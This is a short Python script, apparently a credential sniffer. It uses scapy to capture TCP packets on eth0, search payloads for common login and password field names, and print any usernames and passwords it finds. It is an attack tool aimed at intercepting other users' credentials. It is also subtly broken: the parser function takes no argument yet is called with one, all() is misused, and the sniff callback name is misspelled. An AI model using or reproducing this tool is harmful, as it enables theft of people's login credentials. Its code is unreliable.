from scapy.all import *
from urllib import parse
import re

# Define network interface (eth0) for cabled connection
iface = 'eth0'

def get_login_pass():
    user = None
    passwd = None
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'login_id' , 'loginid', 'session_key', 'pop_login', 'uid', 'account', 'member', 'mailadress', 'login_email', 'loginusername','loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'login_password', 'loginpassword', 'form_pw', 'pwd', 'passwrd', 'wppassword', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group() 

    for field in passfields:
        pass_re = re.search('(%s=[^&]+)' % field, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group() 

    if user and passwd:
        return (user, passwd)

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user, passwd = get_login_pass(body)
        if all(user, passwd):
            print(f'Username: {parse.unquote(user)}\nPassword: {parse.unquote(passwd)}')
    else:
        pass


try:
    sniff(iface=iface, prn=pkt_parset, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)